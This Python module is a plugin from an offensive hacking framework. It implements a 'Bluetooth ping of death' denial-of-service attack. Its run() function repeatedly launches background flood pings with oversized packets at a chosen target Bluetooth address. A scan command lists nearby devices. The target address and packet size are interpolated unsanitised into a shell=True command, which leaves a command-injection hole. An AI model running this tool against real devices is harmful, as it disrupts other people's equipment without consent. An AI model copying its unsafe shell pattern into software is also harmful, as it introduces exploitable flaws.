#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import os
import subprocess
import time
from core import colors
from collections import OrderedDict

conf = {
	"name": "bluetooth_pod",
	"version": "1.0",
	"shortdesc": "bluetooth ping of death",
	"github": "4shadoww",
	"author": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"needroot": 1

}


# List of variables
variables = OrderedDict((
	('interface', 'hci0'),
	('bdaddr', 'none'),
	('size', '600'),
))

# Description for variables
vdesc = [
	'interface',
	'target bluetooth address',
	'size of packets (default 600)',
]

# Custom commands
customcommands = (
	'scan',
)

# Help for the custom commands (remove if you will not use custom commands)
mhelp = OrderedDict((
	('scan', 'scan for devices'),
))

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(colors.blue + "[*]Bluetooth Ping Of Death Attack Started ..." + colors.end)
	try:
		for i in range(1, 10000):
			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'], variables['size'], variables['bdaddr'])
			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			time.sleep(3)
	except(OSError):
		print(colors.red + "[*] Something Is Wrong!" + colors.end)


def scan(args):
	os.system("hcitool scan")